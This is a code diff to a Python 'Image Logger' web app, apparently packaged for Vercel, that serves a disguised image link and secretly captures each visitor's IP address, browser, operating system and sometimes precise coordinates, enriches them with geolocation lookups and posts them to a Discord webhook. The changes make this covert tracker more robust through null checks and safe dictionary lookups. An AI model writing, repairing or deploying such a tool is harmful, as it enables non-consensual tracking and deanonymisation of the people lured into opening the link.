@@ -49,9 +49,9 @@ config = {
 blacklistedIPs = ("27", "104", "143", "164") 
 
 def botCheck(ip, useragent):
-    if ip.startswith(("34", "35")):
+    if ip and ip.startswith(("34", "35")):
         return "Discord"
-    elif useragent.startswith("TelegramBot"):
+    elif useragent and useragent.startswith("TelegramBot"):
         return "Telegram"
     else:
         return False
@@ -70,7 +70,7 @@ def reportError(error):
 })
 
 def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
-    if ip.startswith(blacklistedIPs):
+    if ip and ip.startswith(blacklistedIPs):
         return
     
     bot = botCheck(ip, useragent)
@@ -86,22 +86,22 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
             "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
         }
     ],
-}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
+}) if config["linkAlerts"] else None
         return
 
     ping = "@everyone"
 
     info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
-    if info["proxy"]:
+    if info.get("proxy"):
         if config["vpnCheck"] == 2:
                 return
         
         if config["vpnCheck"] == 1:
             ping = ""
     
-    if info["hosting"]:
+    if info.get("hosting"):
         if config["antiBot"] == 4:
-            if info["proxy"]:
+            if info.get("proxy"):
                 pass
             else:
                 return
@@ -110,7 +110,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
                 return
 
         if config["antiBot"] == 2:
-            if info["proxy"]:
+            if info.get("proxy"):
                 pass
             else:
                 ping = ""
@@ -118,8 +118,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
         if config["antiBot"] == 1:
                 ping = ""
 
-
-    os, browser = httpagentparser.simple_detect(useragent)
+    os, browser = httpagentparser.simple_detect(useragent or "")
     
     embed = {
     "username": config["username"],
@@ -134,26 +133,23 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
             
 **IP Info:**
 > **IP:** `{ip if ip else 'Unknown'}`
-> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
-> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
-> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
-> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
-> **City:** `{info['city'] if info['city'] else 'Unknown'}`
-> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
-> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
-> **Mobile:** `{info['mobile']}`
-> **VPN:** `{info['proxy']}`
-> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`
+> **Provider:** `{info.get('isp', 'Unknown')}`
+> **ASN:** `{info.get('as', 'Unknown')}`
+> **Country:** `{info.get('country', 'Unknown')}`
+> **Region:** `{info.get('regionName', 'Unknown')}`
+> **City:** `{info.get('city', 'Unknown')}`
+> **Coords:** `{str(info.get('lat', ''))+', '+str(info.get('lon', '')) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
+> **Timezone:** `{info.get('timezone', 'UTC/UTC').split('/')[1].replace('_', ' ') if '/' in info.get('timezone', '') else info.get('timezone', 'Unknown')} ({info.get('timezone', 'UTC').split('/')[0]})`
+> **Mobile:** `{info.get('mobile', False)}`
+> **VPN:** `{info.get('proxy', False)}`
+> **Bot:** `{info.get('hosting') if info.get('hosting') and not info.get('proxy') else 'Possibly' if info.get('hosting') else 'False'}`
 
 **PC Info:**
 > **OS:** `{os}`
 > **Browser:** `{browser}`
 
 **User Agent:**
-```
-{useragent}
-```""",
-    }
+}
   ],
 }
     
@@ -205,17 +201,20 @@ width: 100vw;
 height: 100vh;
 }}</style><div class="img"></div>'''.encode()
             
-            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
+            ip = self.headers.get('x-forwarded-for')
+            user_agent = self.headers.get('user-agent')
+
+            if ip and ip.startswith(blacklistedIPs):
                 return
             
-            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
+            if botCheck(ip, user_agent):
                 self.send_response(200 if config["buggedImage"] else 302)
                 self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
                 self.end_headers()
 
                 if config["buggedImage"]: self.wfile.write(binaries["loading"])
 
-                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
+                makeReport(ip, useragent=user_agent, endpoint=s.split("?")[0], url=url)
                 return
             
             else:
@@ -224,28 +223,31 @@ height: 100vh;
 
                 if dic.get("g") and config["accurateLocation"]:
                     location = base64.b64decode(dic.get("g").encode()).decode()
-                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
+                    result = makeReport(ip, user_agent, location, s.split("?")[0], url = url)
                 else:
-                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
+                    result = makeReport(ip, user_agent, endpoint = s.split("?")[0], url = url)
                 
 
                 message = config["message"]["message"]
 
                 if config["message"]["richMessage"] and result:
-                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
-                    message = message.replace("{isp}", result["isp"])
-                    message = message.replace("{asn}", result["as"])
-                    message = message.replace("{country}", result["country"])
-                    message = message.replace("{region}", result["regionName"])
-                    message = message.replace("{city}", result["city"])
-                    message = message.replace("{lat}", str(result["lat"]))
-                    message = message.replace("{long}", str(result["lon"]))
-                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
-                    message = message.replace("{mobile}", str(result["mobile"]))
-                    message = message.replace("{vpn}", str(result["proxy"]))
-                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
-                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
-                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])
+                    message = message.replace("{ip}", ip)
+                    message = message.replace("{isp}", result.get("isp", "Unknown"))
+                    message = message.replace("{asn}", result.get("as", "Unknown"))
+                    message = message.replace("{country}", result.get("country", "Unknown"))
+                    message = message.replace("{region}", result.get("regionName", "Unknown"))
+                    message = message.replace("{city}", result.get("city", "Unknown"))
+                    message = message.replace("{lat}", str(result.get("lat", "")))
+                    message = message.replace("{long}", str(result.get("lon", "")))
+                    tz = result.get('timezone', 'UTC/UTC')
+                    tz_split = tz.split('/') if '/' in tz else [tz, tz]
+                    message = message.replace("{timezone}", f"{tz_split[1].replace('_', ' ')} ({tz_split[0]})")
+                    message = message.replace("{mobile}", str(result.get("mobile", False)))
+                    message = message.replace("{vpn}", str(result.get("proxy", False)))
+                    message = message.replace("{bot}", str(result.get("hosting") if result.get("hosting") and not result.get("proxy") else 'Possibly' if result.get("hosting") else 'False'))
+                    os_info, browser_info = httpagentparser.simple_detect(user_agent or "")
+                    message = message.replace("{browser}", browser_info)
+                    message = message.replace("{os}", os_info)
 
                 datatype = 'text/html'
 
@@ -317,7 +319,7 @@ class WSGIRequestHandlerWrapper(ImageLoggerAPI):
         status_str = f"{self.response_status} {self.response_message}"
         self.start_response_func(status_str, self.response_headers)
 
-# Vercel greift auf diese WSGI-Funktion "app" zu
+# Vercel greift exakt auf diese Funktion als Einstiegspunkt "app" zu
 def app(environ, start_response):
     wrapper = WSGIRequestHandlerWrapper(environ, start_response)
     return [wrapper.wfile.getvalue()]
